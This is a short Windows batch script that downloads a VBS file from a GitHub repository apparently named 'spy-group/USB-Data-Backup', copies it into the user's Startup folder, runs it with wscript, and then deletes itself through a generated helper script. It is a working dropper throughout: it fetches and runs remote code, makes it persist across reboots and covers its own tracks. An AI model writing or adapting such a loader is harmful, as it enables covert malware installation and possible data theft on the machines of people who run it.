@echo off
REM Download the VBS file from GitHub
curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs

REM Copy the downloaded file to the Startup folder
copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM Run the VBS file
wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM Create a new batch file to delete the original batch file
echo @echo off > "%TEMP%\delete_self.bat"
echo del "%~f0" >> "%TEMP%\delete_self.bat"
echo del "%TEMP%\delete_self.bat" >> "%TEMP%\delete_self.bat"

REM Schedule the new batch file to run after the current script finishes
start "" "%TEMP%\delete_self.bat"
